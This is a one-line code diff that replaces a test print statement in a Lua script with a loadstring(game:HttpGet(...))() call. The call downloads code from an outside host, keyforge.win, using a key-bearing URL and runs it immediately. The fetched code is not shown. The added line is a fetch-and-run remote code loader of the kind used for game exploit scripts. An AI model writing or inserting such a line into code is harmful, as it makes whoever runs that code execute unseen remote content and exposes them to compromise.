@@ -1,1 +1,1 @@
-print("test")
+loadstring(game:HttpGet("https://www.keyforge.win/v1/load/cmriqvz26004x04jl5s7uamaw?e=1&script=cmriqz1rh000004l4mcnygudk&lsig=gcGDOlb5njYgZvP2IFLXRyAMeciGhVL_Td2GYonSXpA".."&_cb="..tostring(os.clock()).."-"..tostring(math.random(1,1e9)), true))()
